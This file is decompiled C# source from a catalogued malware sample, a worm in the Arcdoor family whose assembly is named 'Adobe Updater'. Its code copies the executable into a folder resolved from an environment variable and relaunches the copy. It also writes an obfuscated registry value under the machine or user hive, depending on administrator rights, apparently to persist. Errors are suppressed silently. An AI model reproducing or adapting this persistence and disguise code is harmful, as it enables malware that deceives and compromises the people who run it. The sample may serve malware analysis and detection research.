// Decompiled with JetBrains decompiler
// Type: 
// Assembly: Adobe Updater, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3EBFD65F-C01D-4B08-A6E5-41C787EE6341
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00002-msil\Worm.MSIL.Arcdoor.vps-5c5e242af096e77e0fc4a037a0fee5d20df072b9dc640e5ae36ec0f0f68ad065.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Security.Principal;

internal sealed class \u0006
{
  private string \u0002 = Process.GetCurrentProcess().MainModule.FileName;
  private string \u0003 = Path.Combine(Environment.GetEnvironmentVariable(\u000F\u2001.\u0002(670213795)), \u000E\u2001.\u0005\u2000 + \u000F\u2001.\u0002(670213803) + \u000E\u2001.\u0008\u2000);

  public void \u0002()
  {
    this.\u0005();
    this.\u0003();
  }

  public void \u0003()
  {
    try
    {
      if (!Directory.Exists(Environment.GetEnvironmentVariable(\u000F\u2001.\u0002(670213795)) + \u000F\u2001.\u0002(670213809) + \u000E\u2001.\u0005\u2000))
        Directory.CreateDirectory(Environment.GetEnvironmentVariable(\u000F\u2001.\u0002(670213795)) + \u000F\u2001.\u0002(670213809) + \u000E\u2001.\u0005\u2000);
      if (File.Exists(this.\u0003))
        return;
      File.Copy(this.\u0002, this.\u0003, true);
      Process.Start(this.\u0003);
      Environment.Exit(0);
    }
    catch
    {
    }
  }

  public void \u0005()
  {
    try
    {
      if (\u0006.\u0002())
        Registry.LocalMachine.CreateSubKey(\u000F\u2001.\u0002(670213833)).SetValue(\u000E\u2001.\u0006\u2000, (object) this.\u0003);
      else
        Registry.CurrentUser.CreateSubKey(\u000F\u2001.\u0002(670213833)).SetValue(\u000E\u2001.\u0006\u2000, (object) this.\u0003);
    }
    catch
    {
    }
  }

  public static bool \u0002()
  {
    try
    {
      return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
    }
    catch (UnauthorizedAccessException ex)
    {
      return false;
    }
    catch (Exception ex)
    {
      return false;
    }
  }
}
